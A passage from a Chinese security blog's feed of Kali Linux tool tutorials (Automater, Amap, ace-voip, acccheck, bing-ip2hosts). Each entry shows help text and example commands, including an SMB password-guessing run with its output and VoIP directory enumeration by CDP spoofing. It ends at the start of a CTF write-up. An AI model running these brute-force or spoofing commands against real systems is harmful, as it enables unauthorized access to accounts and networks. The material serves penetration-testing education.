class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# wget https://raw.githubusercontent.com/Strubbl/dotfiles/master/bin/bing-ip2hosts</div><div class="line">root@kali:~# chmod +x bing-ip2hosts</div><div class="line">root@kali:~# mv bing-ip2hosts /usr/bin/</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> enumeration </tag>
            
            <tag> osint </tag>
            
            <tag> 枚举 </tag>
            
            <tag> bing-ip2hosts </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Automater]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BAutomater/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Automater介绍"><a href="#0x00-Automater介绍" class="headerlink" title="0x00 Automater介绍"></a>0x00 Automater介绍</h2><p>Automater是一个URL /域，IP地址和Md5哈希开源情报工具，旨在为入侵分析师使分析过程更容易。 给定一个目标（URL，IP或HASH）或一个完整的目标文件，Automater将返回来自如下来源的相关结果：IPvoid.com，Robtex.com，Fortiguard.com，unshorten.me，Urlvoid.com，Labs。 alienvault.com，ThreatExpert，VxVault和VirusTotal。</p><p>工具来源：<a href="http://www.tekdefense.com/automater/" target="_blank" rel="external">http://www.tekdefense.com/automater/</a></p><p><a href="http://www.tekdefense.com/automater/" target="_blank" rel="external">Automater主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/automater.git;a=summary" target="_blank" rel="external">Kali AutomaterRepo仓库</a></p><ul><li>作者：TekDefense.com</li><li>证书：其他</li></ul><h2 id="0x01-Automater功能"><a href="#0x01-Automater功能" class="headerlink" title="0x01 Automater功能"></a>0x01 Automater功能</h2><p>automater - 一个IP和URL分析工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">root@kali:~# automater -h</div><div class="line">用法：Automater.py [-h] [-o OUTPUT] [-b] [-f CEF] [-w WEB] [-c CSV]</div><div class="line">                    [-d DELAY] [-s SOURCE] [--proxy PROXY] [-a USERAGENT] [-V]</div><div class="line">                    [-r] [-v]</div><div class="line">                    target</div><div class="line"></div><div class="line">IP，URL和哈希被动式分析工具</div><div class="line"></div><div class="line">位置参数：</div><div class="line">  target 列出一个IP地址（接受CIDR或短划线符号），</div><div class="line">                        URL或哈希以查询或传递文件的文件名</div><div class="line">                        包含要查询的IP地址信息，URL或哈希</div><div class="line">                        用换行符分隔。</div><div class="line"></div><div class="line">可选参数：</div><div class="line">  -h，--help显示此帮助信息并退出</div><div class="line">  -o OUTPUT，--output OUTPUT</div><div class="line">                        此选项将结果输出到文件。</div><div class="line">  -b，--bot此选项将输出bot的最小化结果。</div><div class="line">  -f CEF，--cef CEF此选项将结果输出为CEF格式文件。</div><div class="line">  -w WEB，--web WEB此选项将结果输出到HTML文件。</div><div class="line">  -c CSV，--csv CSV此选项将结果输出到CSV文件。</div><div class="line">  -d DELAY，-​​-delay DELAY</div><div class="line">                        这将改变延迟到输入的秒数。</div><div class="line">                        默认值为2。</div><div class="line">  -s SOURCE, --source SOURCE</div><div class="line">                        此选项将仅针对特定源引擎运行目标以拉取关联的域</div><div class="line">                        选项在XML配置文件中的siteelement的name属性中定义</div><div class="line">                        可以是由分号分隔的名称列表。</div><div class="line">  --proxy PROXY 此选项将设置要使用的代理（例如 proxy.example.com:8080）</div><div class="line">  -a USERAGENT，--useragent USERAGENT</div><div class="line">                        此选项允许用户设置正在使用的Web服务的user-agent</div><div class="line">                        默认情况下，user-agent设置为Automatic / version</div><div class="line">  -V，--vercheck 此选项检查并报告Automator的版本</div><div class="line">                        检查包含在Automator中的每个python模块</div><div class="line">                        默认值（no -V）为False</div><div class="line">  -r，--refreshxml 此选项刷新远程GitHub站点上的tekdefense.xml文件。 </div><div class="line">                        默认值（no -r）为False。</div><div class="line">  -v，--verbose 此选项将消息打印到屏幕。</div><div class="line">                        默认值（no -v）为False。</div></pre></td></tr></table></figure><h2 id="0x02-Automater用法示例"><a href="#0x02-Automater用法示例" class="headerlink" title="0x02 Automater用法示例"></a>0x02 Automater用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">root@kali:~# automater  -w test -v 210.41.224.132</div><div class="line"></div><div class="line">____________________     Results found for: 210.41.224.132     ____________________</div><div class="line">[+] A records from Robtex.com: www[.]cuit.edu.cn</div><div class="line">No results found in the FNet URL</div><div class="line">[+] VT ASN: 4538</div><div class="line">[+] VT Country: CN</div><div class="line">[+] VT AS Owner: No results found</div><div class="line">[+] VT pDNS: ('2015-03-23 00:00:00', 'www[.]cuit.edu.cn')</div><div class="line">[+] VT Malware: No results found</div><div class="line">[+] VT Mal URLs: No results found</div><div class="line">[+] Blacklist from IPVoid: No results found</div><div class="line">[+] ISP from IPvoid: China Education and Research Networ...</div><div class="line">[+] Country from IPVoid: (CN) China</div><div class="line">[+] Malc0de Date: No results found</div><div class="line">[+] Malc0de IP: No results found</div><div class="line">[+] Malc0de Country: No results found</div><div class="line">[+] Malc0de ASN: No results found</div><div class="line">[+] Malc0de ASN Name: No results found</div><div class="line">[+] Malc0de MD5: No results found</div><div class="line">[+] Reputation Authority Score: 50/100</div><div class="line">[+] FreeGeoIP Country Name: China</div><div class="line">[+] FreeGeoIP Region Name: Sichuan</div><div class="line">[+] FreeGeoIP City: Chengdu</div><div class="line">[+] FreeGeoIP Zipcode: No results found</div><div class="line">[+] FreeGeoIP Latitude: 30.6667</div><div class="line">[+] FreeGeoIP Longitude: 104.0667</div><div class="line">[+] SANS total target IPs seen: No results found</div><div class="line">[+] SANS total packets blocked: No results found</div><div class="line">[+] SANS last seen on: No results found</div><div class="line">[+] SANS first seen on: No results found</div><div class="line">No results found in the THIP</div><div class="line">No results found in the TekHP</div><div class="line">[+] ProjectHoneypot activity type: No results found</div><div class="line">[+] ProjectHoneypot first mail received: No results found</div><div class="line">[+] ProjectHoneypot last mail received: No results found</div><div class="line">[+] ProjectHoneypot total mails received: No results found</div><div class="line">[+] ProjectHoneypot spider first seen: No results found</div><div class="line">[+] ProjectHoneypot spider last seen: No results found</div><div class="line">[+] ProjectHoneypot spider sightings: No results found</div><div class="line">[+] ProjectHoneypot user-agent sightings: No results found</div><div class="line">[+] ProjectHoneypot first post on: No results found</div><div class="line">[+] ProjectHoneypot last post on: No results found</div><div class="line">[+] ProjectHoneypot form posts: No results found</div><div class="line">[+] ProjectHoneypot first rule break on: No results found</div><div class="line">[+] ProjectHoneypot last rule break on: No results found</div><div class="line">[+] ProjectHoneypot rule break sightings: No results found</div><div class="line">[+] ProjectHoneypot first dictionary attack on: No results found</div><div class="line">[+] ProjectHoneypot last dictionary attack on: No results found</div><div class="line">[+] ProjectHoneypot dictionary attack sightings: No results found</div><div class="line">[+] ProjectHoneypot harvester first seen: No results found</div><div class="line">[+] ProjectHoneypot harvester last seen: No results found</div><div class="line">[+] ProjectHoneypot harvester sightings: No results found</div><div class="line">[+] ProjectHoneypot harvester results: No results found</div><div class="line"></div><div class="line">[+] Generating HTML output: test</div><div class="line">test Generated</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> automater </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Amap]]></title>
      <url>/2016/10/18/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BAmap/</url>
      <content type="html"><![CDATA[<h1 id="0x00-Amap介绍"><a href="#0x00-Amap介绍" class="headerlink" title="0x00 Amap介绍"></a>0x00 Amap介绍</h1><p>Amap是第首款针对渗透测试人员的下一代扫描工具， 它尝试识别即使在不同于正常端口的端口上运行应用程序。<br>Amap还可以通过发送触发数据包并在响应字符串列表中查找响应来识别基于非ascii编码的应用程序。</p><p>工具来源：<a href="https://www.thc.org/thc-amap/" target="_blank" rel="external">https://www.thc.org/thc-amap/</a></p><p><a href="http://www.thc.org/thc-amap/" target="_blank" rel="external">Amap主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/amap.git;a=summary" target="_blank" rel="external">Kali Amap Repo仓库</a></p><ul><li>作者：van Hauser and DJ RevMoon</li><li>证书：其他</li></ul><h1 id="0x01-包含在Amap包的工具"><a href="#0x01-包含在Amap包的工具" class="headerlink" title="0x01 包含在Amap包的工具"></a>0x01 包含在Amap包的工具</h1><p>amapcrap - 将随机数据发送到UDP，TCP或SSL端口以获取非法响应</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amapcrap </div><div class="line">amapcrap v5.4 (c) 2011 by van Hauser/THC &lt;vh@thc.org&gt;</div><div class="line">语法：amapcrap [-S] [-u] [-m 0ab] [-M min，max] [-n connections] [-N delay] [-w delay] [-e] [-v] TARGET PORT </div><div class="line"></div><div class="line">选项： </div><div class="line">-S TCP连接后使用SSL（不能与 -u 同时使用） </div><div class="line">-u 使用UDP协议（默认值：TCP）（不能与 -c 同时使用） </div><div class="line">-n 连接最大连接数（默认值：无限制） </div><div class="line">-N 连接之间的延迟（ms）（默认值：0） </div><div class="line">-w 延迟关闭端口之前的延迟（默认值：250） </div><div class="line">-e 当服务器做出响应时不停止发送 </div><div class="line">-v 详细模式 </div><div class="line">-m 0ab 发送为随机垃圾数据：0-空字节，a-字母+空格，b-二进制 </div><div class="line">-M min,max 随机垃圾数据的最小和最大长度 </div><div class="line">TARGET PORT 发送随机垃圾数据的目标（ip或dns）和端口</div><div class="line"></div><div class="line">此工具将随机数据发送到静默端口以获取非法响应以便下一步amap检测， 它输出适用于amap定义的形式。 </div><div class="line">注意：默认情况下所有模式都将被激活（0：10%，a：40% b：50%），模式'a'总是发送以字母和空格结尾的行。 </div><div class="line">可以访问我们的主页http://www.thc.org</div></pre></td></tr></table></figure><h2 id="amapcrap用法示例"><a href="#amapcrap用法示例" class="headerlink" title="amapcrap用法示例"></a>amapcrap用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amapcrap -n 20 -m a  192.168.1.15 80 -v</div><div class="line"><span class="meta">#</span> Starting AmapCrap on 192.168.1.15 port 80</div><div class="line"><span class="meta">#</span> Writing a "+" for every 10 connect attempts</div><div class="line"><span class="meta">#</span> ++</div><div class="line">done</div></pre></td></tr></table></figure><p>amap – Application MAPper:渗透测试人员的下一代扫描工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amap</div><div class="line">amap v5.4 (c) 2011 by van Hauser &lt;vh@thc.org&gt; www.thc.org/thc-amap</div><div class="line">语法: amap [-A|-B|-P|-W] [-1buSRHUdqv] [[-m] -o &lt;file&gt;] [-D &lt;file&gt;] [-t/-T sec] [-c cons] [-C retries] [-p proto] [-i &lt;file&gt;] [target port [port] ...]</div><div class="line">模式： </div><div class="line">-A 地图应用程序：发送触发包和分析响应（默认） </div><div class="line">-B 只抓取标识信息，不发送触发包</div><div class="line">-P 不抓取标识信息横幅或应用程序的东西 - （全连接）端口扫描器 </div><div class="line">选项： </div><div class="line">-1 只发送触发到端口，直到第一次标识。</div><div class="line">-6 使用IPv6而不是IPv4 </div><div class="line">-b 打印响应的ascii标识信息 </div><div class="line">-i FILE 输出Nmap可读文件 </div><div class="line">-u 在命令行上指定的端口UDP（默认为TCP） </div><div class="line">-R 不标识RPC服务 </div><div class="line">-H 不发送被应用程序标记为潜在有害的触发包</div><div class="line">-U 不要转储无法识别的响应（更脚本处理） </div><div class="line">-d 转储所有响应 </div><div class="line">-v 详细模式，使用两次（或更多！）进行调试（不推荐:-) </div><div class="line">-q 不报告关闭的端口，并且不将其打印为不识别的 </div><div class="line">-o FILE [-m] 将输出写入文件FILE，-m创建机器可读输出 </div><div class="line">-c CONS 要进行的并行连接数（默认32，最大256） </div><div class="line">-C RETRIES 连接超时的重新连接数（请参见-T）（默认3） </div><div class="line">-T SEC 连接尝试的连接超时（以秒为单位）（默认为5） </div><div class="line">-t SEC 响应等待超时（以秒为单位）（默认值为5） </div><div class="line">-p PROTO 仅发送此协议的触发包（例如ftp） </div><div class="line">TARGET PORT 要扫描的目标地址和端口（除-i之外）</div><div class="line"> </div><div class="line">amap是用于标识目标端口上的应用程序协议的工具。 </div><div class="line">注意：此版本不是使用SSL支持编译的！ </div><div class="line">使用提示：建议使用选项“-bqv”，“-1”快速检查。</div></pre></td></tr></table></figure><h2 id="Amap用法示例"><a href="#Amap用法示例" class="headerlink" title="Amap用法示例"></a>Amap用法示例</h2><p>扫描192.168.1.15 80端口，显示接收的标识（b），不显示关闭端口（Q），并使用详细输出（V）：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amap -bqv 192.168.1.15 21 </div><div class="line">Using trigger file /etc/amap/appdefs.trig ... loaded 30 triggers</div><div class="line">Using response file /etc/amap/appdefs.resp ... loaded 346 responses</div><div class="line">Using trigger file /etc/amap/appdefs.rpc ... loaded 450 triggers</div><div class="line"></div><div class="line">amap v5.4 (www.thc.org/thc-amap) started at 2016-10-18 14:24:02 - APPLICATION MAPPING mode</div><div class="line"></div><div class="line">Total amount of tasks to perform in plain connect mode: 23</div><div class="line">Waiting for timeout on 23 connections ...</div><div class="line">Protocol on 192.168.1.15 :21/tcp matches ftp - banner: 220---------- Welcome to Pure-FTPd [privsep] ----------\r\n220-You are user number 7 of 5000 allowed.\r\n220-Local time is now 0224. Server port 21.\r\n220-This is a private system - No anonymous login\r\n220-IPv6 connections are also welcome on this ser</div><div class="line">Protocol on 192.168.1.15 :21/tcp matches smtp - banner: 220---------- Welcome to Pure-FTPd [privsep] ----------\r\n220-You are user number 7 of 5000 allowed.\r\n220-Local time is now 0224. Server port 21.\r\n220-This is a private system - No anonymous login\r\n220-IPv6 connections are also welcome on this ser</div><div class="line"></div><div class="line">amap v5.4 finished at 2016-10-18 14:24:02</div></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amap -bqv 192.168.1.15 80 </div><div class="line">Using trigger file /etc/amap/appdefs.trig ... loaded 30 triggers</div><div class="line">Using response file /etc/amap/appdefs.resp ... loaded 346 responses</div><div class="line">Using trigger file /etc/amap/appdefs.rpc ... loaded 450 triggers</div><div class="line"></div><div class="line">amap v5.4 (www.thc.org/thc-amap) started at 2016-10-18 14:25:57 - APPLICATION MAPPING mode</div><div class="line"></div><div class="line">Total amount of tasks to perform in plain connect mode: 23</div><div class="line">Waiting for timeout on 23 connections ...</div><div class="line">Protocol on 192.168.1.15 :80/tcp matches http - banner: HTTP/1.1 400 Bad Request\r\nServer nginx\r\nDate Tue, 18 Oct 2016 182558 GMT\r\nContent-Type text/html\r\nContent-Length 166\r\nConnection close\r\n\r\n&lt;html&gt;\r\n&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;\r\n&lt;body bgcolor="white"&gt;\r\n&lt;center&gt;&lt;h1&gt;400 Bad</div><div class="line"></div><div class="line">amap v5.4 finished at 2016-10-18 14:25:57</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> 扫描工具 </tag>
            
            <tag> amap </tag>
            
            <tag> information gathering </tag>
            
            <tag> amapcrap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之ace-voip]]></title>
      <url>/2016/10/18/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bace-voip/</url>
      <content type="html"><![CDATA[<h2 id="0x00-ace-voip介绍"><a href="#0x00-ace-voip介绍" class="headerlink" title="0x00 ace-voip介绍"></a>0x00 ace-voip介绍</h2><p>ACE（自动公司枚举器）是一个简单而强大的VoIP公司目录枚举工具，模拟IP电话的行为，以便下载给定手机可在其屏幕界面上显示的名称和扩展条目。 以同样的方式，VoIP硬件电话的“企业目录”功能使用户能够通过他们的VoIP手机通过名称轻松拨号，ACE的开发是来自一个针对名字企业目录实现“VoIP Hopper”自动化VoIP攻击的研究想法。 这个概念意味着将来可以基于用户的名字对用户进行攻击，而不是针对随机RTP音频流或IP地址定位VoIP流量。ACE通过使用DHCP，TFTP和HTTP工作，以便下载VoIP公司目录。 然后将目录输出到文本文件，该文本文件可用作其他VoIP评估工具的输入。</p><p>工具来源：<a href="http://ucsniff.sourceforge.net/ace.html" target="_blank" rel="external">http://ucsniff.sourceforge.net/ace.html</a></p><p><a href="http://ucsniff.sourceforge.net/ace.html" target="_blank" rel="external">ace-voip主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/ace-voip.git;a=summary" target="_blank" rel="external">Kali ace-voip Repo仓库</a></p><ul><li>作者：Sipera VIPER 实验室</li><li>证书：GPLv3</li></ul><h2 id="0x01-ace-voip功能"><a href="#0x01-ace-voip功能" class="headerlink" title="0x01 ace-voip功能"></a>0x01 ace-voip功能</h2><p>ace - 一个简单的VoIP公司目录枚举工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ace</div><div class="line">ACE v1.10：自动公司（数据）枚举器 </div><div class="line">用法：ace [-i 接口] [-m mac地址] [-t tftp服务器IP地址| -c cdp模式 | -v 语音虚拟区域网id | -r 虚拟区域网接口  | -d 详细模式] </div><div class="line"></div><div class="line">-i（必选）用于嗅探/发送数据包的接口 </div><div class="line">-m（必选）受害IP电话的MAC地址 </div><div class="line">-t（可选）tftp服务器的IP地址 </div><div class="line">-c（可选）0 CDP监听模式，1 CDP欺骗模式 </div><div class="line">-v（可选）输入语音虚拟区域网ID</div><div class="line">-r（可选）删除虚拟区域网接口 </div><div class="line">-d（可选）详细 | 调试模式 </div><div class="line"></div><div class="line">示例用法： </div><div class="line">使用-m选项需要提供的IP电话的MAC地址 </div><div class="line">用法：ace -t -m </div><div class="line"></div><div class="line">通过DHCP选项150（-m）自动发现TFTP服务器IP</div><div class="line">示例：ace -i eth0 -m 00:1E:F7:28:9C:8e</div><div class="line"></div><div class="line">指定TFTP服务器的IP地址 </div><div class="line">示例：ace -i eth0 -t 192.168.10.150 -m 00:1E:F7:28:9C:8e</div><div class="line"></div><div class="line">指定语音语音虚拟区域网ID</div><div class="line">示例：ace-i eth0 -v 96 -m 00:1E:F7:28:9C:8e</div><div class="line"></div><div class="line">详细模式 </div><div class="line">示例：ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8e -d </div><div class="line"></div><div class="line">删除虚拟区域网接口的模式 </div><div class="line">示例：ace -r eth0.96 </div><div class="line"></div><div class="line">在CDP的侦听模式下自动发现语音虚拟区域网ID</div><div class="line">示例：ace -i eth0 -c 0 -m 00:1E:F7:28:9C:8e</div><div class="line"></div><div class="line">在CDP的欺骗模式下自动发现语音虚拟区域网ID</div><div class="line">示例：ace-i eth0 -c 1 -m 00:1E:F7:28:9C:8e</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> cdp </tag>
            
            <tag> sniffing </tag>
            
            <tag> enumeration </tag>
            
            <tag> ace-voip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集和密码攻击之acccheck]]></title>
      <url>/2016/10/18/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E4%B9%8Bacccheck/</url>
      <content type="html"><![CDATA[<h2 id="0x00-acccheck介绍"><a href="#0x00-acccheck介绍" class="headerlink" title="0x00 acccheck介绍"></a>0x00 acccheck介绍</h2><p>CDPSnarf（Cisco Discovery Protocol Sniffer）是专门用于从CDP包提取信息的网络嗅探器。</p><p>工具来源：<a href="https://labs.portcullis.co.uk/tools/acccheck/" target="_blank" rel="external">https://labs.portcullis.co.uk/tools/acccheck/</a></p><p><a href="http://labs.portcullis.co.uk/application/acccheck" target="_blank" rel="external">acccheck主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/acccheck.git;a=summary" target="_blank" rel="external">Kali acccheck仓库</a></p><ul><li>作者：Faisal Dean</li><li>证书：GPLv2</li></ul><h2 id="0x01-acccheck功能"><a href="#0x01-acccheck功能" class="headerlink" title="0x01 acccheck功能"></a>0x01 acccheck功能</h2><p>acccheck-SMB的密码字典攻击工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root@kali:~# acccheck</div><div class="line"></div><div class="line">acccheck v0.2.1 - By Faiz</div><div class="line"></div><div class="line">描述： </div><div class="line">根据给定的选择尝试连接到IPC $和ADMIN $共享，并尝试用户名和密码的组合，以望通过字典密码猜测攻击来识别给定帐户的密码</div><div class="line"></div><div class="line">用法= ./acccheck [选项] </div><div class="line"></div><div class="line">-t [单个主机IP地址] </div><div class="line">或者</div><div class="line">-T [包含目标IP地址的文件] </div><div class="line"></div><div class="line">选项： </div><div class="line">-p [单个密码] </div><div class="line">-P [包含密码的文件] </div><div class="line">-u [单用户] </div><div class="line">-U [包含用户名的文件] </div><div class="line">-v [详细模式] </div><div class="line"></div><div class="line">例子：</div><div class="line">使用空密码尝试“管理员”帐户</div><div class="line">acccheck -t 10.10.10.1 </div><div class="line">尝试“password.txt”中所有密码穷举“管理员”帐户密码</div><div class="line">acccheck -t 10.10.10.1 -P password.txt </div><div class="line">尝试“password.txt”中所有密码穷举“users.txt”中所有帐户密码</div><div class="line">acccehck -t 10.10.10.1 -U users.txt -P password.txt </div><div class="line">针对单个用户尝试单个密码</div><div class="line">acccheck -t 10.10.10.1 -u administrator -p password</div></pre></td></tr></table></figure><h2 id="0x02-acccheck用法示例"><a href="#0x02-acccheck用法示例" class="headerlink" title="0x02 acccheck用法示例"></a>0x02 acccheck用法示例</h2><p>扫描包含在SMB-ips.txt（T）的IP地址中使用空密码的默认账户Administrator，并使用详细输出（-v）：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# acccheck -T smb-ips.txt -v</div><div class="line">Host:192.168.1.201, Username:Administrator, Password:BLANK</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> smb </tag>
            
            <tag> infogathering </tag>
            
            <tag> passwords </tag>
            
            <tag> acccheck </tag>
            
            <tag> password attack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Web 200 Nevernote]]></title>
      <url>/2016/08/19/CSAW-CTF-Qualification-Round-2013--Web-200-Nevernote/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>来自网站<a href="http://128.238.66.214" target="_blank" rel="external">http://128.238.66.214</a>的管理员Nevernote Admin<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#91;&#x6e;&#x65;&#118;&#101;&#114;&#x6e;&#x6f;&#x74;&#101;&#x61;&#x64;&#109;&#105;&#110;&#x40;&#x6e;&#101;&#x76;&#x65;&#x72;&#x6e;&#111;&#x74;&#x65;&#46;&#x63;&#x6f;&#109;&#93;&#91;&#x32;&#x5d;">&#91;&#x6e;&#x65;&#118;&#101;&#114;&#x6e;&#x6f;&#x74;&#101;&#x61;&#x64;&#109;&#105;&#110;&#x40;&#x6e;&#101;&#x76;&#x65;&#x72;&#x6e;&#111;&#x74;&#x65;&#46;&#x63;&#x6f;&#109;&#93;&#91;&#x32;&#x5d;</a><br>发往邮箱<a href="mailto:challenger@ctf.isis.poly.edu" target="_blank" rel="external">challenger@ctf.isis.poly.edu</a><br>时间:2013年9月19日 星期四 15:05<br>主题:求助</p><p>亲爱的小伙伴:<br>邪恶的黑客已经控制了我的Nevernote网站服务器并且锁定了我的管理帐户是我不能登入，我正在尝试恢复访问，你有没有办法登入我的帐户帮我把notes保存下来吗？虽说网站的安全性较高，但是对于你应该没有问题，我看好你，加油！<br>…………………………………………………………………………………………………………………………谢谢，Nevernote网站管理员</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>访问网站后出现一个登陆界面:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/925421122.png" alt="CSAW CTF Qualification Round 2013 Web 200 Nevernote 